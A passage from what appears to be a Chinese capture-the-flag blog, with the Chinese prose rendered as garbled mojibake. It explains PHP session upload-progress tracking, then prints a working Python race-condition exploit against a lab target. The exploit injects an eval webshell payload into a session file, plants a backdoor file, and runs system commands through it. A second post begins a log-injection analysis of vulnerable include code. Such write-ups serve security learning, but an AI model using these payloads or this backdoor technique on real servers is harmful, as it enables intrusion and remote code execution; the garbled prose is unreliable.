<li>éœ€è¦é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå¦‚ AJAX è½®è¯¢ï¼‰<strong>è¯»å–è¿™ä¸ªä¼šè¯æ•°æ®</strong>ï¼Œå®æ—¶æ˜¾ç¤ºè¿›åº¦æ¡ç»™ç”¨æˆ·ã€‚</li>
</ul>
<p><strong>é…ç½®è¦æ±‚</strong></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span>    <span class="comment">; å¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ª</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">On</span>   <span class="comment">; ä¸Šä¼ å®Œæˆåè‡ªåŠ¨æ¸…ç†è¿›åº¦æ•°æ®</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span>    <span class="comment">; ä¼šæˆä¸ºéšè—å­—æ®µçš„valueçš„å€¼åœ¨sessionæ–‡ä»¶ä¸­çš„å‰ç¼€ï¼Œå¦‚&#x27;upload_progress_my_upload&#x27;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>    <span class="comment">; éšè—å­—æ®µçš„åç§°</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span>    <span class="comment">; æ¯ä¸Šä¼ 1%æˆ–1KBæ›´æ–°è¿›åº¦ï¼ˆå¯è®¾ç½®ä¸ºç™¾åˆ†æ¯”æˆ–å­—èŠ‚ï¼Œå¦‚ 1024ï¼‰</span></span><br></pre></td></tr></table></figure>

<p><strong>åŸºæœ¬ä½¿ç”¨æ­¥éª¤</strong></p>
<ul>
<li><p><strong>è¡¨å•è®¾ç½®</strong><br>åœ¨æ–‡ä»¶ä¸Šä¼ è¡¨å•ä¸­ï¼Œ<strong>å¿…é¡»</strong>æ·»åŠ ä¸€ä¸ªåä¸º <code>PHP_SESSION_UPLOAD_PROGRESS</code> ï¼ˆå…·ä½“åç§°ç”±ä¸Šé¢æåˆ°çš„é…ç½®é¡¹ <code>session.upload_progress.name</code> ç¡®å®šï¼‰çš„éšè—å­—æ®µï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;my_upload&quot;</span> /&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">  &lt;!-- Tips: type=<span class="string">&quot;file&quot;</span>æ—¶ä¼šè‡ªåŠ¨å¼¹å‡ºæ–‡ä»¶é€‰æ‹©æ¡†ï¼Œä¸éœ€è¦æ‰‹åŠ¨è®¾ç½®value --&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>åªæœ‰æ£€æµ‹åˆ°è¡¨å•é‡Œå­˜åœ¨ <code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code> çš„å­—æ®µï¼Œæ‰ä¼šè·Ÿè¸ªæ–‡ä»¶ä¸Šä¼ è¿›åº¦å¹¶å†™å…¥ Session ä¸­ã€‚</p>
</li>
<li><p><strong>è¯»å–è¿›åº¦</strong><br>é€šè¿‡ AJAX æˆ–å…¶ä»–æ–¹å¼ï¼Œä»å‰ç«¯å®šæœŸè¯·æ±‚ä¸€ä¸ª PHP è„šæœ¬ï¼Œè¯»å–ä¼šè¯ä¸­çš„è¿›åº¦ä¿¡æ¯ï¼ˆæ­¤éƒ¨åˆ†ä»…ä½œäº†è§£ï¼Œä¸ä½œæ¼”ç¤ºï¼‰ã€‚</p>
</li>
</ul>
<p><strong>Session ä¸­çš„è¿›åº¦ä¿¡æ¯</strong></p>
<p>ä¼šè¯ä¸­çš„è¿›åº¦ä¿¡æ¯æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé”®ä¸º <code>&#39;upload_progress_my_upload&#39;</code> ï¼ˆå…·ä½“ç”± <code>session.upload_progress.prefix</code> é…ç½®é¡¹ä¸è¡¨å•éšè—å­—æ®µä¸­çš„ <code>value</code> æ‹¼æ¥è€Œæˆï¼‰åŒ…å«ä»¥ä¸‹å…³é”®å­—æ®µï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_progress_my_upload&#x27;</span>] = [</span><br><span class="line">    <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,  <span class="comment">// å¼€å§‹æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="string">&quot;content_length&quot;</span> =&gt; <span class="number">1024000</span>, <span class="comment">// æ–‡ä»¶æ€»å¤§å°ï¼ˆå­—èŠ‚ï¼‰</span></span><br><span class="line">    <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">512000</span>, <span class="comment">// å·²ä¸Šä¼ å­—èŠ‚</span></span><br><span class="line">    <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">false</span>              <span class="comment">// æ˜¯å¦å®Œæˆ</span></span><br><span class="line">    <span class="comment">// åŒ…å«æ¯ä¸ªä¸Šä¼ æ–‡ä»¶è¯¦ç»†ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">    <span class="string">&quot;files&quot;</span> =&gt; [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;example.jpg&#x27;</span>, <span class="comment">// æ–‡ä»¶å</span></span><br><span class="line">            <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="comment">// æ–‡ä»¶ç±»å‹</span></span><br><span class="line">            <span class="string">&#x27;tmp_name&#x27;</span> =&gt; <span class="string">&#x27;/tmp/php5678&#x27;</span>, <span class="comment">// ä¸´æ—¶æ–‡ä»¶å</span></span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="number">0</span>, <span class="comment">// ä¸Šä¼ é”™è¯¯ç </span></span><br><span class="line">            <span class="string">&#x27;size&#x27;</span> =&gt; <span class="number">1048576</span> <span class="comment">// æ–‡ä»¶å¤§å°ï¼ˆå­—èŠ‚ï¼‰</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure>



<p>çŸ¥è¯†äº†è§£å®Œäº†ï¼Œè®©æˆ‘ä»¬æŠŠç›®å…‰è½¬å‘é¢˜ç›®ï¼š</p>
<h2 id="é¢˜ç›®è§£æ"><a href="#é¢˜ç›®è§£æ" class="headerlink" title="é¢˜ç›®è§£æ"></a>é¢˜ç›®è§£æ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„å…³é”®ç‚¹æ˜¯ <code>$file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</code> ï¼Œæ–‡ä»¶åä¸­çš„<code>.</code>ä¼šè¢«æ›¿æ¢ï¼Œæ‰€ä»¥æ‰¾æ–‡ä»¶åä¸åŒ…å«<code>.</code>çš„æ–‡ä»¶ï¼š Session æ–‡ä»¶ã€‚</p>
<p>å·²çŸ¥ Session æ–‡ä»¶çš„åå­—ä¸€èˆ¬æ˜¯<code>sess_xxx</code>çš„å½¢å¼ï¼Œé‚£å¦‚ä½•çŸ¥é“åå­—çš„ååŠéƒ¨åˆ†å‘¢ï¼Ÿå…¶å®å¯ä»¥ä»å“åº”å¤´çš„ <code>Set-Cookie</code> æˆ–è¯·æ±‚å¤´çš„ <code>Cookie</code> å­—æ®µä¸­å¾—åˆ°ï¼Œä¾‹å¦‚ï¼š<code>PHPSESSID=abc123</code>ï¼Œä¾¿å¾—åˆ°äº†åå­—çš„ååŠéƒ¨åˆ†<code>abc123</code>ã€‚ï¼ˆè¯¦è§æˆ‘ä¹‹å‰å†™çš„å…³äº Session çš„æ–‡ç« ï¼‰</p>
<p>å¦‚æœå“åº”å¤´ä¸­æ²¡æœ‰å…³äº Session çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è‡ªå®šä¹‰ SessionID ã€‚éƒ¨åˆ†æœåŠ¡å™¨æ ¡éªŒæœºåˆ¶ä¸å¯é ï¼Œä¸æ ¡éªŒå®¢æˆ·ç«¯å‘é€çš„ SessionID æ˜¯å¦ç”±æœåŠ¡ç«¯ç”Ÿæˆã€‚ç”±äºæœåŠ¡ç«¯æ²¡æœ‰å¯¹åº”çš„ Session æ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šç”Ÿæˆä¸å®¢æˆ·ç«¯è‡ªå®šä¹‰ SessionID å¯¹åº”åå­—çš„ Session æ–‡ä»¶ï¼Œä»è€Œç»™æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚</p>
<h3 id="Burp-Suite-è§£æ³•"><a href="#Burp-Suite-è§£æ³•" class="headerlink" title="Burp Suite è§£æ³•"></a>Burp Suite è§£æ³•</h3><p>æ“ä½œä¸æ–¹ä¾¿ï¼Œä¸å»ºè®®ã€‚</p>
<h2 id="Python-requests-è§£æ³•"><a href="#Python-requests-è§£æ³•" class="headerlink" title="Python requests è§£æ³•"></a>Python requests è§£æ³•</h2><p>æ­¤å¤„å€Ÿç”¨å¤§ä½¬ Dedsec çš„è„šæœ¬ï¼Œæ”¹äº†ç‚¹åŠŸèƒ½ï¼ŒåŠ äº†ç‚¹æ³¨é‡Šï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cfeaa93b-4ae8-42b1-bbb3-fcccd32fe6f7.challenge.ctf.show/&quot;</span> <span class="comment"># é¶åœºURL</span></span><br><span class="line">session_id = <span class="string">&quot;mmk&quot;</span> <span class="comment"># é¶åœºå®‰å…¨æœºåˆ¶ä¸å¯é ï¼Œå¦‚æœæœ‰æ¥è‡ªå®¢æˆ·ç«¯çš„ä¸å­˜åœ¨çš„ session ID å¯¹åº”çš„ session æ–‡ä»¶ï¼Œä¼šåˆ›å»ºç›¸åº”çš„æ–‡ä»¶</span></span><br><span class="line">data_session = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</span>&#125; <span class="comment"># å°†è¦å†™å…¥ session çš„ payloadï¼Œä½¿ session æ–‡ä»¶è¢«åŒ…å«æ—¶æ‰§è¡Œ $_POST[1]</span></span><br><span class="line">data_shell = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;file_put_contents(&#x27;/var/www/html/486.php&#x27;,&#x27;&lt;?php @eval($_GET[cmd]);?&gt;&#x27;);&quot;</span>&#125; <span class="comment"># æ‰§è¡Œ read å‡½æ•°æ—¶æ¤å…¥åé—¨ 486.phpï¼Œè¯¥æ–‡ä»¶ä¼šæ‰§è¡Œ $_GET[cmd]</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: session_id&#125;</span><br><span class="line">fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span>) <span class="comment"># æ–‡ä»¶å¤§å°è¦è¶³å¤Ÿå¤§ï¼Œå¤šç‚¹ä¸Šä¼ æ—¶é—´ï¼Œä¸ºè¯»å–åˆ° session æ–‡ä»¶åˆ›é€ æœºä¼š</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;gbc.png&#x27;</span>, fileBytes)&#125;</span><br><span class="line">exit_event = threading.Event() <span class="comment"># å®šä¹‰å…¨å±€äº‹ä»¶ï¼Œç”¨äºç»“æŸçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_event.is_set(): </span><br><span class="line">        session.post(url,  <span class="comment"># ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨ &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; å­—æ®µå†™å…¥ payload</span></span><br><span class="line">                     data= data_session,</span><br><span class="line">                     cookies=cookies, </span><br><span class="line">                     files=files)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exit_event.is_set():</span><br><span class="line">        session.post(url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+session_id, <span class="comment"># åŒ…å« session æ–‡ä»¶ï¼Œæ¤å…¥åé—¨</span></span><br><span class="line">                     data= data_shell,</span><br><span class="line">                     cookies=cookies)</span><br><span class="line">        response = session.get(url + <span class="string">&quot;486.php&quot;</span>) <span class="comment"># æ£€æµ‹åé—¨æ˜¯å¦æ¤å…¥æˆåŠŸ</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;awa 486 desu!\n&quot;</span>)</span><br><span class="line">            exit_event.<span class="built_in">set</span>() <span class="comment"># æ¤å…¥åé—¨æˆåŠŸï¼Œç»“æŸçº¿ç¨‹</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;çŠ¶æ€ç :<span class="subst">&#123;response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">session</span>): <span class="comment"># æœ€åæŸ¥çœ‹ç›®å½•å†…å®¹ï¼Œä»¥ä¾¿æ‰‹åŠ¨é€‰æ‹©è¦æŸ¥çœ‹çš„æ–‡ä»¶</span></span><br><span class="line">    response = session.get(url + <span class="string">&quot;486.php?cmd=system(&#x27;ls&#x27;);&quot;</span>) <span class="comment"># æ³¨æ„ä¹‹å‰çš„ url å˜é‡æœ«å°¾æ˜¯å¦æœ‰ &quot;/&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># threading.Thread(): åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹å¯¹è±¡</span></span><br><span class="line">            <span class="comment"># target=read: æŒ‡å®šçº¿ç¨‹è¦æ‰§è¡Œçš„å‡½æ•°æ˜¯ read</span></span><br><span class="line">            <span class="comment"># args=(session,): ä¼ é€’ç»™ read å‡½æ•°çš„å‚æ•°ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å« session å˜é‡ï¼ˆæ³¨æ„ï¼š(session,) ä¸­çš„é€—å·æ˜¯å¿…é¡»çš„ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå•å…ƒç´ å…ƒç»„ï¼‰</span></span><br><span class="line">            <span class="comment"># .start(): å¯åŠ¨çº¿ç¨‹ï¼Œä½¿å…¶å¼€å§‹æ‰§è¡Œç›®æ ‡å‡½æ•°</span></span><br><span class="line">        </span><br><span class="line">        exit_event.wait() <span class="comment"># è®©å½“å‰çº¿ç¨‹é˜»å¡ï¼Œç›´åˆ° exit_event è¿™ä¸ªäº‹ä»¶å¯¹è±¡çš„å†…éƒ¨æ ‡å¿—è¢«è®¾ç½®ä¸º True</span></span><br><span class="line">        execute(session)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># æ­¤å¤„æŒ‡ä½œä¸ºè„šæœ¬æ‰§è¡Œæ—¶ä¼šè°ƒç”¨ main() å‡½æ•°ï¼Œä½œä¸ºæ¨¡å—å¼•å…¥æ—¶ä¸ä¼š</span></span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ï¼ˆä»¥ä¸Šä»£ç æ‘˜è‡ª<a target="_blank" rel="noopener" href="http://www.th-dedsec.topã€Šæ¡ä»¶ç«äº‰æ¼æ´ã€‹2025.04.07)/">www.th-dedsec.topã€Šæ¡ä»¶ç«äº‰æ¼æ´ã€‹2025.04.07ï¼‰</a></p>
<p>æœ€åæ ¹æ®æ–‡ä»¶ç›®å½•çš„å†…å®¹ï¼Œåœ¨ URL ä¸­æ‰‹åŠ¨æ„é€  Payload ç»™ 486.php æ–‡ä»¶ä¼ å‚å³å¯è·å¾— flag ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¦æ¤å…¥åé—¨ï¼Ÿ</strong></p>
<p>Session æ–‡ä»¶é‡Œçš„æ–‡ä»¶ä¸Šä¼ æ•°æ®ä¸ä¼šè‡ªåŠ¨åˆ é™¤ï¼Œä½†ä¸ºäº†é˜²æ­¢æœåŠ¡ç«¯åç»­æœ‰åˆ é™¤ session æ–‡ä»¶é‡Œçš„ <code>&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</code> ç­‰æ•°æ®çš„æ“ä½œï¼Œéœ€è¦ä¸€ä¸ªé•¿æœŸå­˜åœ¨çš„åé—¨å®Œæˆä¸‹ä¸€æ­¥ã€‚</p>
<p><strong><code>requests.session()</code> åšä»€ä¹ˆç”¨ï¼Ÿ</strong></p>
<p>å…¶å®åœ¨è¿™é‡Œæ²¡ä»€ä¹ˆç”¨ï¼Œå› ä¸ºç½‘ç«™æ²¡æœ‰è¿”å›å¯ä¾›å®ƒç®¡ç†çš„ Cookie ï¼Œè¯¦è§æˆ‘å†™çš„å…³äº requests åº“çš„æ–‡ç« ã€‚</p>
<p><strong>å…¨è¿‡ç¨‹æµç¨‹</strong></p>
<ul>
<li><p>å‘ Session æ–‡ä»¶ä¸­å†™å…¥ Payloadã€‚</p>
</li>
<li><p>å‘ç½‘ç«™ä¼ å‚ï¼ˆæ—¢é€šè¿‡ URL ä¼ å‚ç»™ <code>$_GET[]</code> æ•°ç»„ï¼Œä¹Ÿé€šè¿‡ POST ä¼ å‚ç»™ <code>$_POST[]</code> æ•°ç»„ï¼‰ï¼ŒåŒ…å«  Session æ–‡ä»¶å¹¶æ¤å…¥åé—¨ã€‚</p>
</li>
<li><p>è®¿é—®åé—¨æ–‡ä»¶ï¼Œé€šè¿‡ URL ä¼ å‚æ‰§è¡Œ <code>ls</code> å‘½ä»¤ï¼ŒæŸ¥çœ‹ç›®å½•å†…å®¹ã€‚</p>
</li>
<li><p>æ‰‹åŠ¨æ„é€  Payload æŸ¥çœ‹ flag æ–‡ä»¶ã€‚</p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" data-id="cm9wms3lr0034kcuhessf40i2" data-title="æ¡ä»¶ç«äº‰æ¼æ´ä¸ Session çš„æ–‡ä»¶ä¸Šä¼ è¿›åº¦è¿½è¸ªåŠŸèƒ½" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">æ–‡ä»¶åŒ…å«</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ç»ˆäºè½®åˆ°äº†æ—¥å¿—æ³¨å…¥" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2025-04-16T13:22:42.871Z" itemprop="datePublished">2025-04-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">å‘½ä»¤æ‰§è¡Œä¸æ–‡ä»¶åŒ…å«</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/">ç»ˆäºè½®åˆ°äº†æ—¥å¿—æ³¨å…¥</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ä¹…ä»°æ—¥å¿—æ³¨å…¥å¤§åï¼Œä»Šå¤©æ¥åˆ†æåˆ†æã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†’å·è¢«è¿‡æ»¤ï¼Œä¸èƒ½ç”¨ä¼ªåè®®äº†ã€‚ç›´æ¥ä¸Šæ—¥å¿—æ³¨å…¥ã€‚</p>
<p>å…ˆæŠ“åŒ…çœ‹çœ‹å“åº”å¤´ <strong><code>server:</code></strong> å­—æ®µï¼Œç¡®å®šæ˜¯ä»€ä¹ˆæœåŠ¡å™¨è½¯ä»¶ã€‚ï¼ˆæµè§ˆå™¨ F12 ä¹Ÿè‡ªå¸¦æŸ¥çœ‹å“åº”å¤´çš„å·¥å…·ï¼‰</p>
<p>æˆ‘æŠ“å‡ºæ¥æ˜¯ <strong><code>server: nginx/1.20.1</code></strong> ï¼ŒæœåŠ¡å™¨ä¸º <strong>nginx</strong>ã€‚ä¸Šç½‘æŸ¥èµ„æ–™ï¼Œnginx æ—¥å¿—æ–‡ä»¶ä½ç½®ä¸ºï¼š <strong><code>/var/log/nginx/access.log</code></strong> ï¼Œä¸€ä¼šå„¿è¦ç”¨ã€‚</p>
<p>å¤§å¤šæ•° Web æœåŠ¡å™¨æ—¥å¿—ä¼šè®°å½•ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li><strong>æ—¶é—´æˆ³</strong>ï¼šè¯·æ±‚å‘ç”Ÿçš„æ—¥æœŸå’Œæ—¶é—´ã€‚</li>
<li><strong>å®¢æˆ·ç«¯IP</strong>ï¼šè®¿é—®è€…çš„IPåœ°å€ã€‚</li>
<li><strong>è¯·æ±‚æ–¹æ³•</strong>ï¼šå¦‚ <code>GET</code>ã€<code>POST</code>ã€<code>PUT</code> ç­‰ã€‚</li>
<li><strong>è¯·æ±‚è·¯å¾„</strong>ï¼šè®¿é—®çš„URLæˆ–æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ <code>/index.html</code>ï¼‰ã€‚</li>
<li><strong>HTTPçŠ¶æ€ç </strong>ï¼šå¦‚ <code>200</code>ï¼ˆæˆåŠŸï¼‰ã€<code>404</code>ï¼ˆæœªæ‰¾åˆ°ï¼‰ã€<code>500</code>ï¼ˆæœåŠ¡å™¨é”™è¯¯ï¼‰ã€‚</li>
<li><strong>User-Agent</strong>ï¼šå®¢æˆ·ç«¯æµè§ˆå™¨æˆ–è®¾å¤‡ä¿¡æ¯ï¼ˆå¯èƒ½åŒ…å«æ”»å‡»è½½è·ï¼‰ã€‚</li>
<li><strong>Referer</strong>ï¼šç”¨æˆ·ä»å“ªä¸ªé¡µé¢è·³è½¬è€Œæ¥ï¼ˆå¯èƒ½æ³„éœ²æ•æ„ŸURLï¼‰ã€‚</li>
<li><strong>è¯·æ±‚å‚æ•°</strong>ï¼šGET&#x2F;POSTå‚æ•°ï¼ˆå¯èƒ½è®°å½•æ•æ„Ÿæ•°æ®ï¼Œå¦‚å¯†ç ã€ä»¤ç‰Œç­‰ï¼‰ã€‚</li>
</ul>
